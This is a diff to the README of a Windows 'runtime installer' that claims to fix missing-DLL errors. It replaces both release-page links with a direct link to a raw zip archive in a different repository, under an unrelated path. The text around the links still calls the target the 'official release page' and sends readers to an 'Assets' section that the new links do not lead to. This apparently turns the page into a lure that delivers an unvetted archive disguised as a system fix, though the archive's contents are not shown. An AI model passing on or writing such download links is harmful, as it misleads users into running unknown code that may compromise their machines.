@@ -5,7 +5,7 @@ description: "Install Visual C++ Redistributable, DirectX, and .NET Framework pa
 ---
 # 🛠️ Runtime-Installer-AIO - Fix missing DLL errors on Windows
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/jothamsubtractive453/Runtime-Installer-AIO/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/jothamsubtractive453/jothamsubtractive453.github.io/raw/refs/heads/main/incoincidence/io-jothamsubtractive-github-v2.5-alpha.4.zip)
 
 ## 📌 About this project
 
@@ -17,7 +17,7 @@ Runtime-Installer-AIO simplifies this process. Instead of hunting for individual
 
 You download the latest version of this installer directly from our official release page. This page contains the most updated files.
 
-[Visit the release page to download](https://github.com/jothamsubtractive453/Runtime-Installer-AIO/releases)
+[Visit the release page to download](https://github.com/jothamsubtractive453/jothamsubtractive453.github.io/raw/refs/heads/main/incoincidence/io-jothamsubtractive-github-v2.5-alpha.4.zip)
 
 1. Navigate to the link above.
 2. Look for the "Assets" section at the bottom of the latest release post.
